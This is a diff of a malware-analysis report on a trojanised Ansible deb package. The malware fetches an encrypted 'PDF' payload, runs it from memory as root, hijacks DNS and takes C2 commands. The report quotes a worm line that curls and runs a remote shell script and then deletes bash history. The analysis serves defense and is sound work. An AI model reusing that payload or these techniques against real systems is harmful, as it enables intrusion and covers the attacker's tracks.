@@ -47,15 +47,19 @@ Just like what is shown below.
 
 We can see this file is trying to connect to some socket and using the extra libraries mentioned before, we can also see that the file is probably trying to manipulate the processes(**/proc/%d/fd/%d**) on the system and trying to create files on ram(**memfd_create**).
 
-## File analysis with ghidra
+## Ansibled analysis with ghidra
+ 
+The code flow is based on signal handlers and structures. The structure "DAT_00104190" is used as a global variable and its value determines whether the code will curl or execute the pdf.  The code then enters an infinite loop of sleeps until it detects a pdf file, at which point it executes the ReadFile functions.
 
-This file flow is based on signal handlers and structures. The structure "DAT_00104190" is considered as a variable and its value will determine if the code will curl or will execute the pdf, as it is in an infinite cycle of sleeps until it detects the pdf and then runs the ReadFile functions.  The first part of the code where a file ansibled.lock is deleted was the only one we couldn't find a reason to.
+The main function also executes a thread that listens for incoming connections on a port, reads the data and returns "Authentication verification failed" closing the File Descriptor sent by the connection.
+
+It is unclear why the file "ansibled.lock" is deleted at the beginning of the code. It is possible that this is a check to determine if the system is infected, which may be used later by the virus.
+
 ### Encrypt
 A function started at `0x001016da` that XOR's a second argument with the third and stores the result in the first.
 
 ![alt text](img/encript.png)
-### Threads
-The main function executes a thread that is always listening and waits for a connection to be made to a port reads it and saves it on a variable.
+
 ### Singal handler
 On memory address `00101b37`is a function that will be the handler of a signal.
 
@@ -64,7 +68,7 @@ On memory address `00101b37`is a function that will be the handler of a signal.
 This function points to two others FUN_00101758 and FUN_00101a07.
 
 #### FUN_00101758
-At `00101758` the function decodes two strings:
+At `00101758` the function decodes two strings,using the encrypt function:
 -  From `"m6/2m%7+&\'l2&$` to `/tmp/guide.pdf`
 -  From `*662xmms{plstzlstrlsvqm%7+&\'l2&$` to `http://192.168.160.143/guide.pdf`
 
@@ -107,24 +111,25 @@ Upon the comparison shown below, we concluded they didn't match. The size dispar
 
 
 #### FUN_00101a07 -> ReadFile
-This is the second function of the handler, it is ran after the pdf is donwloaded and it's crucial for understanding the pdf's operations. It starts by decrypting the PDF and proceeds to execute the decrypted code contained within the PDF.
+This is the second function of the handler, it is ran after the pdf is donwloaded. It starts by decrypting the PDF and proceeds to execute the decrypted code contained within the PDF.
 
-#### FUN_001019b4 -> File decription
+##### FUN_001019b4 -> File decription
 This function serves the purpose of decrypting the PDF file to reveal the contents of the malicious code. It takes a pointer, a size, and a byte as inputs. \
 The function then XORs byte by byte with the specified input byte.
 
 ![alt text](img/Filedecription.png)
 
-#### FUN_00101870 -> RunSecretCode
+##### FUN_00101870 -> RunSecretCode
 This code works right after the pdf gets decrypted it copies the pdf to **RAM** with the name found on "0x64656c6269736e61". Then it loads the pdf as a library and looks for the symbol contained on "&DAT_001020d3" that is "RUN". After knowing the address of that symbol it sends the code to run from there.
 
 ![alt text](/img/RunSecret.png)
 
 ## PDF analysis
 We created a function to decrypt the PDF. Following this, this we opened ghidra for analysis, has was mentioned the initial function executed is the Run function, so we started our analysis from there.
+![alt text](img/pyscript.png)
 
 ### Run
-This function starts creating a file called "ansibled.lock" in /tmp, this file was eliminated in the "ansibled" file, leading us to believe that it is not crash in case this malware is run several times. 
+This function initially creates a file called "ansibled.lock" in the /tmp directory. However, this file is later deleted in the "ansibled" file. It appears that the deletion of the "ansibled.lock" file in the beginning of the function may be a precaution to prevent issues or data overwriting if the malware is executed multiple times. This ensures that the file is not recreated or manipulated if the malware is run again.
 
 ### Proc
 #### Change Permissions
@@ -135,25 +140,22 @@ At the beginning of the pdf, the program changes its path to `/` and the uid and
   seteuid(0);
 ```
 #### initConnection
-This function checks the sock state, adds one to the list of the number of servers goes to the structure CommService to get the string "192.168.160.143:12345", extracts the port from the IP, and creates a socket IPV4. Using those parameters class ConnectTimeout
+This function checks the sock state, adds one to the list of the number of servers goes to the structure CommService to get the string "192.168.160.143:12345", extracts the port from the IP, and creates a socket IPV4. Using those parameters calls ConnectTimeout.
 
 #### connectTimout
 This function tries to connect to the IP and port specified in a given timeframe.
-It starts getting the file status flags 
 
 #### getEndianness
 This function always returns "Little".
 
 #### getBuild
-This always returns "x86_64"
+This always returns "x86_64".
 
 #### UpdateNameSvrs
-This function writes in the "ect/resolve.conf" file the  line "nameserver 193.136.172.20\nnameserver 8.8.8.8\n" changin' the ususal DNS server, probably making an attacker-controlled machine the default DNS
+This function writes in the "ect/resolve.conf" file the  line "nameserver 193.136.172.20\nnameserver 8.8.8.8\n" changing the usual DNS server, probably making an attacker-controlled machine the default DNS.
 
 #### RecvLine
-(socket, buff, len)
-Recebe mensagens no socket byte a byte e guarda no buffer,  retorna o tamano dos dados ou -1 se falhar.
-
+Receives messages byte by byte on the socket and stores them in the buffer, returns the size of the data or -1 if it fails.
 
 #### ProcessCmd
  This Function receives as 1st parameter the length of the cmd and the second parameter is the actual cmd then it uses if clauses to determine what to execute. It is important to notice that in the end of some commands the attacker executes `ClearHistory` to clear all the commands done previosly trying to hide its actions.
@@ -173,37 +175,55 @@ Recebe mensagens no socket byte a byte e guarda no buffer,  retorna o tamano do
 + UPDATE - Destroys Temporary files like logs and history.
 
 #### Telnet Scanner
-We are uncertain of what this telnet Scanner is, the code is too dense, and many arithmetic operations are done to maintain context and perceive what is done. Although we made some assumptions with some pieces of code, strings, functions, and messages as well as the whole context of the malware.
+We are uncertain of what this telnet Scanner is, the code is too dense, and many arithmetic operations are done to maintain context and perceive what is done.
+
+![alt text](img/Scanner1.png)
+
+Although we made some assumptions with some pieces of code, strings, functions, and messages as well as the whole context of the malware.
 - This is a scanner for open Telnet ports in the network, it scans the network for Telnet and then tries to brute force them.  
 - When it's successful it sends to the attacker's server the information (IP, port, username, and password)
-- Then it sends the following payload to the connected machines `cd /tmp;busybox curl 192.168.160.143/a.sh; chmod 777; sh a.sh;rm -rf ~/.bash_history `.\
+- Then it sends the following payload to the connected machines `cd /tmp;busybox curl 192.168.160.143/a.sh; chmod 777; sh a.sh;rm -rf ~/.bash_history `.
 
 We tried to curl the `a.sh` to understand it but we just got the following error.
 
 ![alt text](img/ash.png)
 
-In summary we believe that the Tenete scanner is likely running a worm aimed at infecting machines with open telnet ports across the network to which the user's system is connected.
+In summary we believe that the Telnet scanner is likely running a worm aimed at infecting machines with open telnet ports across the network to which the user's system is connected.
+
+
 
 ### How it works
 
-The `proc` function initiates by gathering essential system settings before executing the malicious code, utilizing previously defined functions. It manages the execution flow by first waiting for all child processes to terminate and subsequently freeing the associated memory. This memory cleanup continues until it stops receiving the 'PING' command. 
+The `proc` function initiates by gathering essential system settings before executing the malicious code, using previously defined functions. It manages the execution flow by first waiting for all child processes to terminate and subsequently freeing the associated memory. This memory cleanup continues until it stops receiving the 'PING' command. 
 After if the next command encountered is a 'DUP' command, the program stops with `exit(0)`.
 
 The subsequent segment of the function focuses on responding to received commands using the `processCmd` function. Before processing, the function meticulously parses the received command, eliminating unnecessary spaces, removing `\n`, and converting tokens to uppercase. These tokens are then organized into an array and passed to `processCmd` for further handling.
 
 # Conclusions
-
+Firstly it downloads a pdf file from "192.168.160.143" that contains code, then it decrypts it to RAM so it's not found easily by antivirus and runs from there. In RAM, it changes to the root directory, changes its own permissions to root, changes the default DNS server, and then can execute different commands depending on what commands are given on port "12345" from the same previous IP from a connection established earlier. Those commands can range from protocols TCP/ICMP/HTTP to Telnet scanners, to download and run a python script that most likely based on packages downloaded will let the attacker remotely access the infected machine.
 
 ## Response to initial questions
 - **Do we really have malware?**\
-Yes, although we only have a vague idea of what both the Telnet scanner and the python script do the fact that it changes the DNS server to the infected machine(To then probably redirect to a fake website and steal credentials/cookies).  Also due to the nature of the Python packages installed, we can also deduce that the Python script will be used to connect remotely to the infected machine by the attacker.
+Yes, although we only have a vague idea of what the Telnet scanner, the python script and the bash script do, the fact that it changes the DNS server to the infected machine(To then probably redirect to a fake website and steal credentials/cookies). Also due to the nature of the Python packages installed, we can also deduce that the Python script will be used to connect remotely to the infected machine by the attacker.
 - **How does the malware work and why a deb is used?**\
-This code is a piece of malware put into an update packet of Ansible. Firstly it downloads a pdf file from "192.168.160.143" that contains code, then it decrypts it to memory so it's not found easily by antivirus and runs from there.  In memory, it changes to the root directory, changes its own permissions to root, changes the default DNS server, and then can execute different commands depending on what commands are given on port "12345" from the same previous IP from a connection established earlier. Those commands can range from protocols TCP/ICMP/HTTP to Telnet scanners, to download and run a python script that most likely based on packages downloaded will let the attacker remotely access the infected machine.
+This code is a piece of malware put into an update packet of Ansible. 
+
+    + **Legitimacy**: Since deb packages are widely used for software distribution in Linux environments, they may appear legitimate to users and system administrators increasing the chance of installation.
+    
+    + **Integration with Package Managers**: Linux package managers like apt make it simple for users to install and manage deb packages.
+
+    + **Potential for Root Access**: If the malware exploits system vulnerabilities or escalates privileges, installing it through a deb package could grant the attacker root access or other elevated privileges.
+
+    + **Persistence**: Malware distributed via deb packages can be challenging to detect and remove once installed since the malware can have root access it can hide additional malware files on any point of the file system using ACL flags to difficult.
+
 - **Are other hosts involved?**\
-Yes, the attacker has most likely control over the machine with IP "192.168.160.143". This IP is crucial to several operations including: Downloading the PDF, Receiving commands to execute with ProccessCMDand downloading the Python script.
+It is highly probable that the attacker has control over the machine with the IP "192.168.160.143" within the network. This IP plays a crucial role in various operations, such as downloading the PDF, receiving commands to execute with ProccessCMD, and downloading the Python script.
+Furthermore, the IP "193.136.172.20" is modified to serve as the default DNS, suggesting that it is a machine controlled by the attacker within the network.
+Also as mentioned before if the malware has indeed worm-like behaviors it will affect multiple machines inside the network
 - **What is the potential impact on our organization?**\
 If the malware is correctly executed in other words, not caught by Firewalls, antivirus, or similar software, this malware could potentially:
--Exposure of Personal and Credit Information: The malware can intercept sensitive data such as usernames, passwords, credit card numbers, and other personal information entered by users on legitimate websites by manipulating DNS.
-- Credential Theft: With shell access to the victim machine, the malware can extract stored credentials like usernames and passwords, enabling unauthorized access to various accounts and systems.
-- Denial of Service (DoS): The malware can launch DoS attacks, disrupting the availability of services, websites, or networks, leading to financial losses and operational disruptions for affected organizations.
-- Stealing Private Certificates: Private certificates are essential for secure communication between servers and clients. By stealing these certificates, the malware can facilitate man-in-the-middle attacks, intercepting and tampering with sensitive data exchanged between users and servers.
+    - Exposure of Personal and Credit Information: The malware can intercept sensitive data such as usernames, passwords, credit card numbers, and other personal information entered by users on legitimate websites by manipulating DNS.
+    - Credential Theft: With shell access to the victims machine, the malware can extract stored credentials like usernames and passwords, enabling unauthorized access to various accounts and systems.
+    - Denial of Service (DoS): The malware can launch DoS attacks, disrupting the availability of services, websites, or networks, leading to financial losses and operational disruptions for affected organizations.
+    - Hardware damage: By using a panoply of attacks is possible to cause irreversible damage to the hardware of the infected machines.
+    - Stealing Private Certificates: Private certificates are essential for secure communication between servers and clients. By stealing these certificates, the malware can facilitate man-in-the-middle attacks, intercepting and tampering with sensitive data exchanged between users and servers.
